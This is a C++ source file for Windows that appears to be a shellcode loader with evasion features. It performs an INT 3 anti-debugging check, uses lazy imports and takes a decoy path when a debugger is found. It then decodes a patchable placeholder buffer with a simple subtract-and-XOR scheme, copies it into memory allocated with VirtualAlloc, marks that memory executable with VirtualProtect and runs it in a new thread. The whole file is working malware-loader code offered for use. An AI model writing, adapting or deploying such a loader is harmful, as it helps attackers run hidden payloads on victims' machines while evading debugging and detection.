#include "code.h"
#include "lazy_importer.hpp"
#include "winuser.h"
#include <string>
#include <cstring>
#include <ostream>
#include <stdlib.h>
#include <stdio.h>


char* c16memcpy(char* s1, const char* s2, size_t n) {
	return static_cast<char*>(memcpy(s1, s2, n * sizeof(char)));
}
void* MMcpy(void* dst, const void* src, size_t len)
{
	char* ch_dst = (char*)dst;
	char* ch_src = (char*)src;
	if (NULL == ch_dst || NULL == ch_src) {
		return NULL;
	}

	void* rest = ch_dst;

	if (ch_dst <= ch_src || (char*)ch_dst >= (char*)ch_src + len) {
		while (len--) {
			*(char*)ch_dst = *(char*)ch_src;
			ch_dst = (char*)ch_dst + 1;
			ch_src = (char*)ch_src + 1;
		}
	}
	else {
		ch_src = (char*)ch_src + len - 1;
		ch_dst = (char*)ch_dst + len - 1;
		while (len--) {
			*(char*)ch_dst = *(char*)ch_src;
			ch_dst = (char*)ch_dst - 1;
			ch_src = (char*)ch_src - 1;
		}
	}
	return rest;
}

bool Tesbuer()
{
	__try
	{
		__asm  //x86 implementation
		{
			_emit 0xCD
			_emit 0x03 //INT 03
			_emit 0xC3 //RET
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		return false;
	}

	return true;
}

int Testms()
{
	char* garbage = (char*)malloc(10);
	for (int i = 0; i < 10; i++)
	{
		garbage[i] = rand() % 256;
	}
	return 0;
}

int start()
{
	if (Tesbuer())
	{
		Testms();
		return 0;
	}
	else {
		DWORD dwThreadId;
		// 线程ID
		//HANDLE hThread;
		// 线程句柄
		DWORD dwOldProtect;
		//char shellcode[DATA_SIZE] = { 0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41 };
		char shellcode[DATA_SIZE] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
		DWORD size = ((PDWORD)shellcode)[0];//size
		HANDLE event = CreateEvent(NULL, FALSE, TRUE, NULL);
		char* tmpptr = shellcode + sizeof(DWORD);

		char* llm_ppVoid1 = (char*)VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_READWRITE);

		for (int i = 0; i < size; i++)
		{
			tmpptr[i] = (tmpptr[i] - 1) ^ (i + 1);
			//printf("0x%02x,", scode1[i]);
		}
		c16memcpy((char*)llm_ppVoid1, (const char*)tmpptr, size);
		Testms();
		VirtualProtect(llm_ppVoid1, size, PAGE_EXECUTE, &dwOldProtect);
		WaitForSingleObject(CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)llm_ppVoid1, NULL, NULL, &dwThreadId), INFINITE);
		// 一直等待线程执行结束
		while (1)
		{
			Sleep(12000);
		}
		//return 0;
	}
}